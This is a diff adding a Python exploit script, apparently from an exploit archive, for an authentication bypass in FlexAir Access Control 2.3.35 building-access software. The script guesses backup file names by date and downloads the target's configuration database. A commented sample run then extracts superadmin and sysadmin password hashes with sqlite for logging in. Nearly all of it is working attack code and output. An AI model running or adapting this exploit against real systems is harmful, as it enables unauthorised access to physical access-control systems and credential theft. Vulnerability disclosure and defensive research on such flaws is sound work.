@@ -1,0 +1,97 @@
+# Exploit Title: FlexAir Access Control 2.3.35 - Authentication Bypass
+# Google Dork: NA
+# Date: 2019-11-11
+# Exploit Author: LiquidWorm
+# Vendor Homepage: https://www.computrols.com/capabilities-cbas-web/
+# Software Link: https://www.computrols.com/building-automation-software/
+# Version: 2.3.35
+# Tested on: NA
+# CVE : CVE-2019-7666, CVE-2019-7667
+# Advisory: https://applied-risk.com/resources/ar-2019-007
+# Paper: https://applied-risk.com/resources/i-own-your-building-management-system
+
+#!/usr/bin/env python
+# -*- coding: utf8 -*-
+#
+# Prima FlexAir Access Control 2.3.35 Database Backup Predictable Name Exploit
+# Authentication Bypass (Login with MD5 hash)
+#
+# Older versions: /links/Nova_Config_2019-01-03.bck
+# Older versions: /Nova/assets/Nova_Config_2019-01-03.bck
+# Newer versions: /links/Nova_Config_2019-01-03_13-53.pdb3
+# Fixed versions: 2.4
+#
+###################################################################################
+#
+# lqwrm@metalgear:~/stuff/prima$ python exploitDB.py http://192.168.230.17:8080
+# [+] Please wait while fetchin the backup config file...
+# [+] Found some juice!
+# [+] Downloading: http://192.168.230.17:8080/links/Nova_Config_2019-01-07.bck
+# [+] Saved as: Nova_Config_2019-01-07.bck-105625.db
+# lqwrm@metalgear:~/stuff/prima$ sqlite3 Nova_Config_2019-01-07.bck-105625.db 
+# SQLite version 3.22.0 2018-01-22 18:45:57
+# Enter ".help" for usage hints.
+# sqlite> select usrloginname,usrloginpassword from users where usrid in (1,2);
+# superadmin|0dfcfa8cc7fd39d96ffe22dd406b5065
+# sysadmin|1af01c4a5a4ec37f451a9feb20a0bbbe
+# sqlite> .q
+# lqwrm@metalgear:~/stuff/prima$ 
+#
+###################################################################################
+#
+# 11.01.2019
+#
+
+import os#######
+import sys######
+import time#####
+import requests#
+
+from datetime import timedelta, date
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+piton = os.path.basename(sys.argv[0])
+
+if len(sys.argv) < 2:
+    print '[+] Usage: '+piton+' [target]'
+    print '[+] Target example 1: http://10.0.0.17:8080'
+    print '[+] Target example 2: https://primanova.tld\n'
+    sys.exit()
+
+host = sys.argv[1]
+
+def datum(start_date, end_date):
+    for n in range(int ((end_date - start_date).days)):
+        yield start_date + timedelta(n)
+
+start_date = date(2017, 1, 1)
+end_date = date(2019, 12, 30)
+
+print '[+] Please wait while fetchin the backup config file...'
+
+def spinning_cursor():
+    while True:
+        for cursor in '|/-\\':
+            yield cursor
+
+spinner = spinning_cursor()
+
+for mooshoo in datum(start_date, end_date):
+    sys.stdout.write(next(spinner))
+    sys.stdout.flush()
+    time.sleep(0.1)
+    sys.stdout.write('\b')
+    h = requests.get(host+'/links/Nova_Config_'+mooshoo.strftime('%Y-%m-%d')+'.bck', verify=False)
+    
+    if (h.status_code) == 200:
+        print '[+] Found some juice!'
+        print '[+] Downloading: '+host+'/links/Nova_Config_'+mooshoo.strftime('%Y-%m-%d')+'.bck'
+        timestr = time.strftime('%H%M%S')
+        time.sleep(1)
+        open('Nova_Config_'+mooshoo.strftime('%Y-%m-%d')+'.bck-'+timestr+'.db', 'wb').write(h.content)
+        print '[+] Saved as: Nova_Config_'+mooshoo.strftime('%Y-%m-%d')+'.bck-'+timestr+'.db'
+        sys.exit()
+
+print '[-] No backup for you today. :('
